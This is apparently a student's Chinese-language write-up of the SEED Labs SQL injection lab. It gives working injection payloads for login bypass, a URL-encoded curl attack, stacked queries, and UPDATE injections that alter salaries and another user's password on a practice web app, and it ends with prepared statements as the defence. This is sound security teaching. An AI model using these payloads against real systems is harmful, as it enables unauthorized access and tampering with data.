# SQL Injection Attack Lab

这一期的主题是 SQL 注入攻击. 

[地址](https://seedsecuritylabs.org/Labs_16.04/Web/Web_SQL_Injection/)

[实验指导](https://seedsecuritylabs.org/Labs_16.04/PDF/Web_SQL_Injection.pdf)

[参考资料](https://blog.csdn.net/qq_37672864/article/details/89331585)


## 预备知识

- SQL 基础

## 实验环境

虚拟机中 `/var/www/SQLInjection/` 给出了一个 web 项目, 本地浏览器访问 `http://www.SEEDLabSQLInjection.com`. 

同样虚拟机已经配装了 MySQL, 指令 `mysql -u root -pseedubuntu` 可访问, 于此实验相关的数据库为 User, 库中包含表 credential. 

``` SQL
use Users;
show tables;
select * from credential;
```

## 实验任务

### T2 SQL Injection Attack on SELECT Statement

在登录页 (对应 `/var/www/SQLInjection/unsafe home.php`) 插入 SQL 片段来完成任务. 下面是 `unsafe home.php` 中相关的代码片段. 

``` php
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
        FROM credential
        WHERE name= '$input_uname' and Password='$hashed_pwd'";
```

#### T2.1 SQL Injection Attack from webpage

我们需要在登录页面的输入框中插入 SQL, 以 Admin 的身份登录. 

经过测试, 这段 SQL 是没问题的. 
``` sql
SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
FROM credential
WHERE name = 'Admin' and Password = (select Password from credential where name='Admin');
```

如果一切顺利, 3 行 `Password=` 后面的内容就是答案, 但是传入的密码会通过 SHA1 加密, 利用密码的位置插入 SQL 片段不太合适. 所以在用户名位置插入下面的 SQL 片段

``` sql
Admin' and Password = (select Password from credential where name='Admin') #
```
::: tip
最后的 `#` 会注释掉多余的 SQL. 
:::

#### T2.2 SQL Injection Attack from command line
这个本质和 2.1 一样, 但是它要求仿造请求完成插入, 这里使用系统携带的 curl 工具. 
``` bash
curl 'www.SeedLabSQLInjection.com//unsafe_home.php?username=Admin%27%20and%20Password%20%3D%20%28select%20Password%20from%20credential%20where%20name%3D%27Admin%27%29%20%23&Password=111'
```
在请求中出现的特殊字符需要转成 ASCII 的 16 进制编码, 另外 `www.SeedLabSQLInjection.com` 后面的 `/` 貌似需要转义. 

#### T2.3 Append a new SQL statement

这里要求在 2.1 和 2.2 的基础上尝试一次注入两句 SQL, 
``` sql {2}
Admin' and Password = (select Password from credential where name='Admin'); 
insert into credential(name) values('test') #
```
这里第二句是一句插入, 添加一个名为 test 的用户. 

这个实验没有成功. 

### T3 SQL Injection Attack on UPDATE Statement

有 T2 的基础之后, T3 要简单的多, 主要是体验一下对数据库的修改, 相对读取数
据, 这种 SQL 注入危害更大.

任务要求在用户的 Edit Profile 页面注入 SQL, `/var/www/SQLInjection/unsafe edit backend.php` 中对应的代码片段. 
``` php
$hashed_pwd = sha1($input_pwd); 
$sql = "UPDATE credential SET nickname='$input_nickname',email='$input_email', address='$input_address', Password='$hashed_pwd', PhoneNumber='$input_phonenumber' WHERE ID=$id;";
$conn->query($sql);
```

#### T3.1 Modify your own salary

修改自己的薪水, 在 phone number 输入框中输入, 

``` php
', Salary='50000
```
不过这里要假装知道薪水对应的字段是 Salary. 

#### T3.2 Modify other people’ salary
修改自己老板 Boby 的薪水, 在 phone number 中添加,
``` sql
', Salary='1000' where Name='Boby' #
```

#### T3.3 Modify other people’ password
修改老板 Boby 的密码, 进一步打击报复, 在 address 中添加
``` sql
', Password='7c4a8d09ca3762af61e59520943dc26494f8941b', PhoneNumber = '' where Name='Boby' #
```
::: tip
正如之前提到, 这里的密码要预先经过 SHA1 加密, 明文为 123456. 
:::

## 如何应对 SQL 注入

### SQL Server 做了什么
对于 SQL Server, 一条 SQL 语句会被拆解为 SQL 部分与数据部分, 直到最后要写入数据库, SQL 语句都是用 placeholder 来占用数据所在的位置. 按顺序完成: 
1. 对 SQL 语句进行语义检查
1. 将 SQL 语句中的关键字 (SELECT 等) 转成机器可执行的代码
1. 优化, 选择最优操作
1. 将最优的方法写入缓冲区内
1. 将数据与编译完成的 SQL 绑定
1. 写入

### 分离 SQL 部分与数据部分

利用 Prepared SQL Statement 来提前做好数据的占位, 也就是在一开始将 SQL 部分和数据部分分离, 防止数据部分危险的内容与 SQL 部分结合, 篡改本意. 





